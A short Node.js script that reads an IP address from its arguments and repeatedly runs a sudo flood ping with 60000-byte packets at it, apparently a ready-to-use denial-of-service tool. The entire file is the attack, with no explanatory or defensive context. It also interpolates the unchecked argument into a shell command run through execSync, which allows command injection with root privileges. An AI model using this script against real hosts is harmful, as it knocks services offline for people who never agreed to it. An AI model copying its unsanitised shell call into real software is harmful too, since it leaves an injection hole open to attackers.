//imports

import {execSync} from 'child_process'
import yargs from 'yargs';
import { hideBin } from 'yargs/helpers';

//declarations
const yarg = yargs(hideBin(process.argv)).option("n",{default:5}).parse()
let i=1
let n=yarg.n
const ip= yarg._[0]


//code
while(i<n){execSync(`sudo ping -f -s 60000 ${ip}`); ++i}
